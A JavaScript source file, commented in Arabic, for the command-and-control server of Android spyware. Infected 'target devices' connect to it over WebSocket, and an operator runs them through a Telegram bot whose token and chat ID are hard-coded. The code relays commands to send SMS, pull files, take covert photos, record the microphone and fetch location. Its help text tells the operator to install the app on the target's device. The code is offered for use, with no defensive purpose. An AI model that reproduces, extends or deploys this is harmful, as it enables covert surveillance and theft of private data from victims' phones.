const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');

// ==================== إعدادات أساسية ====================
const TOKEN = '7748520168:AAFGnwcqJfyo_26cBnsySWWHwSOWYRDs3ts';
const CHAT_ID = '1630822492';
const PORT = process.env.PORT || 8999;

// الشعارات الأساسية
const EMOJIS = {
    SERVER: '🖥️',
    CONNECTION: '📡',
    DEVICE: '📱',
    COMMAND: '⚙️',
    MESSAGE: '📨',
    FILE: '📁',
    CAMERA: '📸',
    MICROPHONE: '🎤',
    LOCATION: '📍',
    SUCCESS: '✅',
    ERROR: '❌',
    WARNING: '⚠️',
    INFO: 'ℹ️'
};

// ==================== تهيئة التطبيق ====================
const app = express();
const server = http.createServer(app);
const wss = new webSocket.Server({ server });
const bot = new telegramBot(TOKEN, { polling: true });

// تخزين الأجهزة
const clients = new Map();
let currentUuid = '';
let currentNumber = '';

// ==================== مسارات الويب ====================
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>نظام التحكم</title>
            <meta charset="UTF-8">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    color: white;
                    text-align: center;
                }
                .container {
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(10px);
                    border-radius: 20px;
                    padding: 40px;
                    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                    border: 1px solid rgba(255, 255, 255, 0.2);
                }
                h1 {
                    font-size: 2.5em;
                    margin-bottom: 20px;
                }
                .emoji {
                    font-size: 3em;
                    margin-bottom: 20px;
                }
                .status {
                    font-size: 1.2em;
                    opacity: 0.9;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="emoji">${EMOJIS.SERVER}${EMOJIS.SUCCESS}</div>
                <h1>نظام التحكم يعمل بنجاح</h1>
                <p class="status">الأجهزة المتصلة: ${clients.size}</p>
                <p class="status">جاهز لاستقبال الأوامر</p>
            </div>
        </body>
        </html>
    `);
});

// ==================== WebSocket Handling ====================
wss.on('connection', (ws, req) => {
    const uuid = require('uuid').v4();
    const model = req.headers.model || 'غير معروف';
    const battery = req.headers.battery || 'غير معروف';
    
    console.log(`${EMOJIS.SUCCESS} جهاز جديد متصل: ${model}`);
    
    ws.uuid = uuid;
    clients.set(uuid, {
        model: model,
        battery: battery,
        connectedAt: new Date()
    });
    
    // إرسال رسالة الترحيب للبوت
    bot.sendMessage(CHAT_ID, 
        `${EMOJIS.SUCCESS} ${EMOJIS.DEVICE} *جهاز جديد متصل*\n\n` +
        `*الموديل:* ${model}\n` +
        `*البطارية:* ${battery}\n` +
        `*المعرف:* ${uuid.substring(0, 8)}`,
        { parse_mode: 'Markdown' }
    );
    
    ws.on('message', (message) => {
        console.log(`${EMOJIS.MESSAGE} رسالة من ${model}:`, message.toString());
    });
    
    ws.on('close', () => {
        console.log(`${EMOJIS.ERROR} انقطع الاتصال بجهاز: ${model}`);
        bot.sendMessage(CHAT_ID,
            `${EMOJIS.ERROR} ${EMOJIS.DEVICE} *جهاز منفصل*\n\n` +
            `*الموديل:* ${model}`,
            { parse_mode: 'Markdown' }
        );
        clients.delete(uuid);
    });
    
    // إرسال رسالة ترحيبية للجهاز
    ws.send(JSON.stringify({
        type: 'welcome',
        message: 'مرحباً بك في نظام التحكم',
        uuid: uuid
    }));
});

// ==================== Bot Command Handling ====================
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    bot.sendMessage(chatId,
        `${EMOJIS.SUCCESS} *مرحباً بك في نظام التحكم*\n\n` +
        `${EMOJIS.INFO} *الأوامر المتاحة:*\n` +
        `/start - عرض هذه القائمة\n` +
        `/devices - عرض الأجهزة المتصلة\n` +
        `/commands - عرض جميع الأوامر\n\n` +
        `${EMOJIS.DEVICE} الأجهزة المتصلة الآن: *${clients.size}*`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                keyboard: [
                    [`${EMOJIS.DEVICE} عرض الأجهزة`],
                    [`${EMOJIS.COMMAND} تنفيذ أمر`],
                    [`${EMOJIS.INFO} المساعدة`]
                ],
                resize_keyboard: true
            }
        }
    );
});

bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    
    if (clients.size === 0) {
        bot.sendMessage(chatId,
            `${EMOJIS.WARNING} *لا توجد أجهزة متصلة*\n\n` +
            `${EMOJIS.INFO} تأكد من اتصال التطبيق على الجهاز المستهدف`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    let devicesList = `${EMOJIS.DEVICE} *الأجهزة المتصلة (${clients.size})*\n\n`;
    
    let index = 1;
    clients.forEach((device, uuid) => {
        devicesList += `${index}️⃣ *${device.model}*\n`;
        devicesList += `   ${EMOJIS.BATTERY} البطارية: ${device.battery}\n`;
        devicesList += `   ${EMOJIS.CONNECTION} المعرف: ${uuid.substring(0, 8)}\n\n`;
        index++;
    });
    
    bot.sendMessage(chatId, devicesList, { parse_mode: 'Markdown' });
});

bot.onText(/\/commands/, (msg) => {
    const chatId = msg.chat.id;
    
    const commandsList = 
        `${EMOJIS.COMMAND} *جميع الأوامر المتاحة*\n\n` +
        `${EMOJIS.DEVICE} *أوامر الأجهزة:*\n` +
        `/devices - عرض الأجهزة المتصلة\n` +
        `/send - إرسال رسالة لجهاز\n\n` +
        `${EMOJIS.FILE} *أوامر الملفات:*\n` +
        `/file - الحصول على ملف\n` +
        `/delete - حذف ملف\n\n` +
        `${EMOJIS.CAMERA} *أوامر الكاميرا:*\n` +
        `/camera - التقاط صورة\n` +
        `/record - تسجيل فيديو\n\n` +
        `${EMOJIS.LOCATION} *أوامر الموقع:*\n` +
        `/location - الحصول على الموقع`;
    
    bot.sendMessage(chatId, commandsList, { parse_mode: 'Markdown' });
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // التحقق من صلاحية المستخدم
    if (chatId != CHAT_ID) {
        bot.sendMessage(chatId, 
            `${EMOJIS.ERROR} *وصول مرفوض*\n\n` +
            `${EMOJIS.WARNING} ليس لديك صلاحية للوصول لهذا النظام.`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    // معالجة الأزرار
    if (text === `${EMOJIS.DEVICE} عرض الأجهزة`) {
        handleDevicesButton(chatId);
    } else if (text === `${EMOJIS.COMMAND} تنفيذ أمر`) {
        handleCommandsButton(chatId);
    } else if (text === `${EMOJIS.INFO} المساعدة`) {
        handleHelpButton(chatId);
    }
});

function handleDevicesButton(chatId) {
    if (clients.size === 0) {
        bot.sendMessage(chatId,
            `${EMOJIS.WARNING} *لا توجد أجهزة متصلة*\n\n` +
            `${EMOJIS.INFO} قم بتشغيل التطبيق على الجهاز المستهدف`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const buttons = [];
    clients.forEach((device, uuid) => {
        buttons.push([{
            text: `${EMOJIS.DEVICE} ${device.model}`,
            callback_data: `device_${uuid}`
        }]);
    });
    
    bot.sendMessage(chatId,
        `${EMOJIS.DEVICE} *اختر جهازاً:*\n\n` +
        `${EMOJIS.INFO} يوجد ${clients.size} جهاز متصل`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: buttons
            }
        }
    );
}

function handleCommandsButton(chatId) {
    bot.sendMessage(chatId,
        `${EMOJIS.COMMAND} *أدخل الأمر الذي تريد تنفيذه:*\n\n` +
        `${EMOJIS.INFO} مثال:\n` +
        `• send:رقم_الهاتف:الرسالة\n` +
        `• file:مسار_الملف\n` +
        `• camera:صورة\n` +
        `• location:موقع`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                force_reply: true
            }
        }
    );
}

function handleHelpButton(chatId) {
    bot.sendMessage(chatId,
        `${EMOJIS.INFO} *دليل الاستخدام*\n\n` +
        `1️⃣ *تثبيت التطبيق:*\n` +
        `   └─ قم بتثبيت التطبيق على الجهاز المستهدف\n\n` +
        `2️⃣ *انتظار الاتصال:*\n` +
        `   └─ سيظهر الجهاز في قائمة "عرض الأجهزة"\n\n` +
        `3️⃣ *اختر الجهاز:*\n` +
        `   └─ اضغط على اسم الجهاز ثم اختر الأمر\n\n` +
        `4️⃣ *أدخل المعلومات:*\n` +
        `   └─ اتبع التعليمات لإدخال البيانات المطلوبة\n\n` +
        `${EMOJIS.WARNING} *ملاحظة:*\n` +
        `   • بعض الأوامر تتطلب إذونات خاصة\n` +
        `   • الأوامر قد تستغرق بضع ثوانٍ`,
        { parse_mode: 'Markdown' }
    );
}

// ==================== Callback Queries ====================
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = msg.chat.id;
    
    if (data.startsWith('device_')) {
        const uuid = data.replace('device_', '');
        const device = clients.get(uuid);
        
        if (!device) {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: 'الجهاز لم يعد متصلاً',
                show_alert: true
            });
            return;
        }
        
        currentUuid = uuid;
        
        bot.editMessageText(
            `${EMOJIS.COMMAND} *اختر أمراً للجهاز:*\n` +
            `${EMOJIS.DEVICE} ${device.model}\n\n` +
            `${EMOJIS.INFO} اختر أحد الأوامر:`,
            {
                chat_id: chatId,
                message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: `${EMOJIS.MESSAGE} إرسال رسالة`, callback_data: 'cmd_send' },
                            { text: `${EMOJIS.LOCATION} الموقع`, callback_data: 'cmd_location' }
                        ],
                        [
                            { text: `${EMOJIS.CAMERA} كاميرا`, callback_data: 'cmd_camera' },
                            { text: `${EMOJIS.MICROPHONE} ميكروفون`, callback_data: 'cmd_mic' }
                        ],
                        [
                            { text: `${EMOJIS.FILE} ملفات`, callback_data: 'cmd_file' },
                            { text: `${EMOJIS.INFO} معلومات`, callback_data: 'cmd_info' }
                        ]
                    ]
                }
            }
        );
    } else if (data.startsWith('cmd_')) {
        const command = data.replace('cmd_', '');
        handleDeviceCommand(chatId, command, msg);
    }
});

function handleDeviceCommand(chatId, command, msg) {
    if (!currentUuid || !clients.has(currentUuid)) {
        bot.sendMessage(chatId,
            `${EMOJIS.ERROR} *خطأ*\n\n` +
            `${EMOJIS.WARNING} لم يتم تحديد جهاز أو الجهاز غير متصل`,
            { parse_mode: 'Markdown' }
        );
        return;
    }
    
    const device = clients.get(currentUuid);
    
    switch (command) {
        case 'send':
            bot.deleteMessage(chatId, msg.message_id);
            bot.sendMessage(chatId,
                `${EMOJIS.MESSAGE} *إرسال رسالة*\n\n` +
                `${EMOJIS.INFO} أدخل رقم الهاتف:`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: { force_reply: true }
                }
            );
            break;
            
        case 'location':
            sendCommandToDevice('location');
            bot.sendMessage(chatId,
                `${EMOJIS.SUCCESS} *جاري طلب الموقع*\n\n` +
                `${EMOJIS.DEVICE} من الجهاز: ${device.model}\n` +
                `${EMOJIS.INFO} قد يستغرق بضع ثوانٍ`,
                { parse_mode: 'Markdown' }
            );
            break;
            
        case 'camera':
            bot.deleteMessage(chatId, msg.message_id);
            bot.sendMessage(chatId,
                `${EMOJIS.CAMERA} *التقاط صورة*\n\n` +
                `${EMOJIS.INFO} اختر نوع الكاميرا:\n` +
                `• main - الكاميرا الرئيسية\n` +
                `• selfie - كاميرا السيلفي`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        keyboard: [['main', 'selfie']],
                        resize_keyboard: true
                    }
                }
            );
            break;
            
        case 'mic':
            bot.deleteMessage(chatId, msg.message_id);
            bot.sendMessage(chatId,
                `${EMOJIS.MICROPHONE} *تسجيل صوت*\n\n` +
                `${EMOJIS.INFO} أدخل مدة التسجيل (بالثواني):`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: { force_reply: true }
                }
            );
            break;
            
        case 'file':
            bot.deleteMessage(chatId, msg.message_id);
            bot.sendMessage(chatId,
                `${EMOJIS.FILE} *الحصول على ملف*\n\n` +
                `${EMOJIS.INFO} أدخل مسار الملف:\n` +
                `• مثال: DCIM/Camera\n` +
                `• مثال: Download`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: { force_reply: true }
                }
            );
            break;
            
        case 'info':
            sendCommandToDevice('info');
            bot.sendMessage(chatId,
                `${EMOJIS.INFO} *جاري جمع معلومات الجهاز*\n\n` +
                `${EMOJIS.DEVICE} ${device.model}\n` +
                `${EMOJIS.CLOCK} يرجى الانتظار...`,
                { parse_mode: 'Markdown' }
            );
            break;
    }
}

function sendCommandToDevice(command, data = '') {
    wss.clients.forEach(client => {
        if (client.uuid === currentUuid) {
            client.send(`${command}:${data}`);
        }
    });
}

// ==================== معالجة الردود ====================
bot.on('reply_to_message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const replyToText = msg.reply_to_message.text;
    
    if (replyToText.includes('أدخل رقم الهاتف')) {
        currentNumber = text;
        bot.sendMessage(chatId,
            `${EMOJIS.SUCCESS} *تم حفظ الرقم*\n\n` +
            `${EMOJIS.INFO} الآن أدخل نص الرسالة:`,
            {
                parse_mode: 'Markdown',
                reply_markup: { force_reply: true }
            }
        );
    } else if (replyToText.includes('أدخل نص الرسالة')) {
        sendCommandToDevice('send', `${currentNumber}/${text}`);
        bot.sendMessage(chatId,
            `${EMOJIS.SUCCESS} *جاري إرسال الرسالة*\n\n` +
            `${EMOJIS.MESSAGE} إلى: ${currentNumber}\n` +
            `${EMOJIS.INFO} النص: ${text.substring(0, 50)}${text.length > 50 ? '...' : ''}`,
            { parse_mode: 'Markdown' }
        );
        currentNumber = '';
    } else if (replyToText.includes('أدخل مدة التسجيل')) {
        const duration = parseInt(text);
        if (duration > 0 && duration <= 300) {
            sendCommandToDevice('mic', duration);
            bot.sendMessage(chatId,
                `${EMOJIS.SUCCESS} *جاري التسجيل*\n\n` +
                `${EMOJIS.MICROPHONE} المدة: ${duration} ثانية\n` +
                `${EMOJIS.INFO} سيتم إرسال الملف بعد الانتهاء`,
                { parse_mode: 'Markdown' }
            );
        } else {
            bot.sendMessage(chatId,
                `${EMOJIS.ERROR} *مدة غير صالحة*\n\n` +
                `${EMOJIS.WARNING} يجب أن تكون بين 1 و 300 ثانية`,
                { parse_mode: 'Markdown' }
            );
        }
    } else if (replyToText.includes('أدخل مسار الملف')) {
        sendCommandToDevice('file', text);
        bot.sendMessage(chatId,
            `${EMOJIS.SUCCESS} *جاري إرسال الملف*\n\n` +
            `${EMOJIS.FILE} المسار: ${text}\n` +
            `${EMOJIS.INFO} قد يستغرق بضع ثوانٍ`,
            { parse_mode: 'Markdown' }
        );
    }
});

// ==================== معالجة الأوامر النصية ====================
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (chatId != CHAT_ID) return;
    
    if (text === 'main' || text === 'selfie') {
        const cameraType = text;
        sendCommandToDevice('camera', cameraType);
        bot.sendMessage(chatId,
            `${EMOJIS.SUCCESS} *جاري التقاط صورة*\n\n` +
            `${EMOJIS.CAMERA} النوع: ${cameraType}\n` +
            `${EMOJIS.INFO} سيتم إرسال الصورة قريباً`,
            { parse_mode: 'Markdown' }
        );
    }
});

// ==================== تشغيل السيرفر ====================
server.listen(PORT, () => {
    console.log(`
    ${EMOJIS.SERVER} ${EMOJIS.SUCCESS} *السيرفر يعمل!*
    
    ${EMOJIS.INFO} معلومات:
    ├─ المنفذ: ${PORT}
    ├─ الرابط: http://localhost:${PORT}
    └─ البوت: ${bot.isPolling() ? 'نشط' : 'غير نشط'}
    
    ${EMOJIS.CONNECTION} جاهز لاستقبال الاتصالات...
    `);
});

// ==================== فحص الاتصال الدوري ====================
setInterval(() => {
    wss.clients.forEach(client => {
        if (client.readyState === webSocket.OPEN) {
            client.ping();
        }
    });
}, 30000);
